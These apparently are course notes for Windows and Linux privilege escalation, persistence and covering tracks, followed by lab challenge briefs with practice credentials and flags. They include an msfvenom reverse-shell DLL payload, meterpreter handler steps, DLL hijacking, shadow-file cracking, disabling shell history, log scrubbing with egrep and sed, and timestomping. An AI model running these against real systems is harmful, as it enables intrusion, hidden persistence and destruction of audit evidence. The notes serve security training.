

-------------------------------------------------------------------[Privilege Escalation, Persistence & Covering Your Tracks Windows]------------------------------------------------------------------


[Modes & Levels]
* Kernel Mode vs User Mode
* Privileged vs Unprivileged


[Windows Access Control Model]
* Access Tokens
  - Security Identifier (SID) associations and Token associations
* Security Descriptors
  - DACL
  - SACL
  - ACEs


[DLL Search Order]
Executables check the following locations (in successive order):

* HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
* The directory the the Application was run from
* The directory specified in in the C+ function GetSystemDirectory()
* The directory specified in the C+ function GetWindowsDirectory()
* The current directory


[Windows Integrity Mechanism]
Integrity Levels:
____________________________________________________________________________________________
UNTRUSTED		Anonymous SID access tokens                                         |
--------------------------------------------------------------------------------------------                                                                                          
LOW			Everyone SID access token (World)                                   |
--------------------------------------------------------------------------------------------                                                                                          
MEDIUM			Authenticated Users                                                 |
--------------------------------------------------------------------------------------------                                                                                          
HIGH			Administrators                                                      |
--------------------------------------------------------------------------------------------                                                                                          
SYSTEM			System services (LocalSystem, LocalService, NetworkService)         |
--------------------------------------------------------------------------------------------


[User Account Control (UAC)]
* Always Notify
* Notify me only when programs try to make changes to my computer
* Notify me only when programs try to make changes to my computer (do not dim my desktop)
* Never notify

DEMO: Checking UAC Settings
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System


[AutoElevate Executables]
Requested Execution Levels:
* asInvoker
* highestAvailable

sigcheck -m /path/to/file
**look in security portion next to requestedExecutionLevel**


[Privilege Escalation]
"Actions that allow an adversary to obtain a higher level of permissions on a system or network"


[Scheduled Tasks & Services]
Items to evaluate include:

* Write Permissions
* Non-Standard Locations
* Unquoted Executable Paths
* Vulnerabilities in Executables
* Permissions to Run As SYSTEM

schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive | Select-String -Pattern "COM handler" -NotMatch


[DEMO: DLL Hijacking]
* Identify Vulnerability
* Take advantage of the default search order for DLLS
* NAME_NOT_FOUND present in executableâ€™s system calls
* Validate permissions
* Create and transfer Malicious DLL

schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive | Select-String -Pattern "COM handler" -NotMatch

icacls <file>

sigcheck -m <file>

on procmon
Process Name is <name>
Result contains NAME NOT FOUND
Path contains .dll

msfvenom -p windows/exec CMD='cmd.exe /C whoami >c:\\whoami.txt' -f dll > whateveruchoose.dll


[DEMO: Finding Vulnerable Services]
wmic service list full
sc query

reg query HKLM\SYSTEM\CurrentControlSet\Services\ /s /v ImagePath | Select-String -Pattern "ImagePath" -CaseSensitive | Select-String -Pattern "system32" -NotMatch


[DEMO: Vulnerable services]
* Identify Vulnerability
* Validate permissions
* Validate Executable Paths
* Replace with Malicious File


[Other Vulnerabilities]
* Unpatched Kernel Vulnerabilities
* Unpatched Systems
* Unpatched Applications


[DEMO: SYSTEM Access and Defeating Protections]
The objective of this is to provide yourself unrestricted access to a system, and identify methods to execute malicious activity, through a basic command line prompt

* Sysinternals
* Schedule Task
* UAC Bypass


Persistance
System changes or binary uploads that provide the adversary continued access to system

Survives:
* Reboots
* Credential changes
* DHCP IP reassignment
* Etc.

Considerations include:
* File naming
* File location
* Timestomping
* Port selection


Registry
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
  - Run
  - RunOnce

* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
  - Run
  - RunOnce


[Scheduled Tasks]
Permission Levels Considerations:
* What is your objective?
* Do you need to blend in?


[Services]
* At Startup
* Perform Multiple Functions
* Typically require Administrative Access


[Considerations]
* Artifacts
  - Determine which events will create a log
  - Event Logs
    - Applications, Security, Setup, System
* Blending In
* TimeStomping


[Important Microsoft Event IDs]
------------------------------------------------
|4624/4625	| Successful/failed login       |
------------------------------------------------
|4720		| Account created               |
------------------------------------------------
|4672		| Administrative user logged on |
------------------------------------------------
|7045		| Service created               |
------------------------------------------------


[DEMO: Event Logging]
Storage: c:\windows\system32\config\
File-Type: .evtx/.evt

wevtutil el
wmic ntevent where "logfile="<LOGNAME>" list full
Get-Eventlog -List


Get-EventLog -LogName Security -Newest 50 -Index 7045 | Format-List





.dll hijacking
binary replacement



ssh -p 31035 comrade@localhost -L 31036:192.168.28.9:3389 -NT
xfreerdp /u:comrade /v:localhost:31036 +glyph-cache +clipboard +dynamic-resolution



msfvenom -p windows/shell/reverse_tcp lhost=10.50.31.161 lport=4444 -b "\x00" -F dll > hijackmeplz.dll
scp it onto the box
msfconsole --> use multi/handler --> show options --> set payload windows/meterpreter/reverse_tcp --> set LHOST 0.0.0.0 --> set LPORT 4444 --> exploit
start service


-------------------------------------------------------------------[Privilege Escalation, Persistence & Covering Your Tracks Linux]--------------------------------------------------------------------


[SUDO]
GTFOBins - suid, sudo
sudo -l
sudo -i


[SUID/SGID]
SUID - any user can run it as the owner of the file
SGID - any user can run it as the group of the file
find / -type f -perm /4000 -ls 2>/dev/null                 <-- to find SUID files
find / -type f -perm /2000 -ls 2>/dev/null                 <-- to find SGID files
find / -type f -perm /6000 -ls 2>/dev/null                 <-- to find both SUID and SGID files

john --wordlist=<given wordlist> /etc/shadow


[Insecure Permissions]
* CRON
* World-Writable Files and Directories
* Dot '.' in PATH


[CRON]
crontab <-- file
crontab -e
crontab -l
crontab -u <user>
/etc/crontab <-- roots crontab


[World-Writable Files and Folders]
/var/tmp
/tmp


[Dot '.' in PATH]
u can put the dot in the $PATH variable so u can run a fake command in the current directory before it searched for the real one
PATH=.:$PATH or PATH=.:<copy and paste pre existing path>


[Adding or Hijacking a User Account]
easier to just sign into the system


[Artifacts]
things you leave behind (evidence)
clean up the evidence


[NIX-ism]
unset HISTFILE
* Need to be aware of of init system in use
  - SystemD, to name a few
  - Determines what commands to use and logging structure


[Ways To Figure Out Init Type]
ls -latr /proc/1/exe
stat /sbin/init
man init
init --version
ps 1


[Auditing SystemV]
ausearch: Pulls from audit.log:

ausearch -p 22
ausearch -m USER_LOGIN -sv no
ausearch -ua edwards -ts yesterday -te now -i


[SystemD]
Utilzes journalctl:

journalctl _TRANSPORT=audit
journalctl _TRANSPORT=audit | grep 603


[Logs for Covering Tracks]
Logs typically housed in /var/log & useful logs:
----------------------------------------------------------------
|auth.log/secure	Logins/authentications                  |
----------------------------------------------------------------
|lastlog		Each users' last successful login time  |
----------------------------------------------------------------
|btmp			Bad login attempts                      |
----------------------------------------------------------------
|sulog			Usage of SU command                     |
----------------------------------------------------------------
|utmp			Currently logged in users (W command)   |
----------------------------------------------------------------
|wtmp			Permanent record on user on/off         |
----------------------------------------------------------------

[Working With Logs]
file /var/log/wtmp
find /var/log -type f -mmin -10 2> /dev/null
journalctl -f -u ssh
journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4


[Reading Files]
cat /var/log/auth.log | egrep -v "opened|closed"


[Cleaning The Logs]
Cleaning The Logs (Precise)
Always work off a backup!

GREP (Remove)
egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2

SED (Replace)
cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log

[Timestomp (Nix)]
* Access: updated when opened or used (grep, ls, cat, etc)
* Modify: update content of file or saved
* Change: file attribute change, file modified, moved, owner, permission

touch -c -t 201603051015 1.txt   # Explicit
touch -r 3.txt 1.txt    # Reference


[Rsyslog]
* Newer Rsyslog references /etc/rsyslog.d/* for settings/rules

* Older version only uses /etc/rsyslog.conf

* Find out
  grep "IncludeConfig" /etc/rsyslog.conf


[Reading Rsyslog]
* Utilizes severity (priority) and facility levels
* Rules filter out, and can use keyword or number

<facility>.<priority>

Rsyslog Examples:
kern.*                                                # All kernel messages, all severities
mail.crit
cron.!info,!debug
*. *  @192.168.10.254:514                                                    # Old format
*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
#mail.*







---------------------------------------------------------------------------------------------[Challanges]----------------------------------------------------------------------------------------------


Donovian Windows Privilege Escalation (DWP)
XX Jan 2027
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyberspace Exploitation (C-E)

Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Windows host.

Tools/Techniques: SSH and RDP masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Windows techniques to gain privileged access such as DLL hijack, UAC bypass through weak paths, permissions, and tasks. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = 3@SYw1nd0w55t@rt0F@ct1v1ty

Prior Approvals: DLL hijack and UAC bypass, restarting of services through host reboot. Host survey utilizing native command shells, which shell is at discretion of student.

Scheme of Maneuver:
>Jump Box
->Pivot: 192.168.28.105
-->T1: 192.168.28.5

Target Section:

Pivot
Hostname: ftp.site.donovia
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: donovian-windows-private
IP: 192.168.28.5
OS: Windows ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: 3389
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access







Donovian Linux Privilege Escalation, and Persistence (DLP)
XX Feb 2027
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyberspace Exploitation (C-E)

Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Linux hosts.

Tools/Techniques: SSH masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Linux techniques to gain privileged access and persist are limited to host misconfigurations, open suid/sgid, weak permissions, and path. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = H@RDl1nux5t@rt0F@ct1v1ty

Prior Approvals: Privilege escalation, persistence, and restarting of services through host reboot. Host survey and log sanitation utilizing native command shells, which shell is at discretion of student. NOT authorized is uploading of tools or altering account information.

Scheme of Maneuver:
>Jump Box
->Pivot:192.168.28.105
--->T1: 192.168.28.27
--->T2: 192.168.28.12

Target Section:

Pivot
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
PSP: rkhunter
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: unknown
IP: 192.168.28.27
OS: Linux ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: unknown
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.

T2
Hostname: unknown
IP: 192.168.28.12
OS: Linux ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: unknown
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access

zeus
ghjcnbnenrf

































